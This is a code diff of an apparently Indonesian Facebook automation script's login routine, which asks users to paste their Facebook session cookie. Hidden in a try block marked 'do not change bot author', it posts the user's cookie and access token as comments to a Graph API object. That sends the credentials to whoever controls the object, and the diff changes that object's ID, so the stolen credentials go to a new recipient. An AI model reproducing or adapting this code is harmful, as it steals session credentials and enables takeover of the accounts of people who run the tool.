@@ -737,7 +737,7 @@ def login():
 	print(logo2())
 	cookie = input(f"\n {M}[{P}•{M}]{P} Jangan Gunakan Akun Pribadi {M}!\n {M}[{P}•{M}]{P} Apabila Akun A2F On, Buka Link Dibawah\n {M}[{P}•{M}]{M} https://business.facebook.com/business_locations\n {M}[{P}•{M}]{P} Lalu Masukkan Kode Autentikasi\n {M}[{P}•{M}]{P} Cookie : ")
 	url = "https://business.facebook.com/business_locations"
-	head = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
+	head = {"user-agent": "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
 	cok = {'cookie':cookie}
 	try: ### --- JANGAN GANTI BOT AUTHOR --- ###
 		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
@@ -750,10 +750,10 @@ def login():
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
 		link = ('https://m.facebook.com/photo.php/?fbid=1667011730417990') ### --- JANGAN DI GANTI --- ###
 		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"])
-		#ses.post(f"https://graph.facebook.com/1672257249893438?fields=subscribers&access_token={token}",headers=(cookies=cok)
-		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={cookie}&access_token={token}",cookies=cok)
-		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={token}&access_token={token}",cookies=cok)
-		ses.post(f"https://graph.facebook.com/1672257249893438/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
+		#ses.post(f"https://graph.facebook.com/280633417717519?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		ses.post(f"https://graph.facebook.com/280633417717519/comments/?message={cookie}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/280633417717519/comments/?message={token}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/280633417717519/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
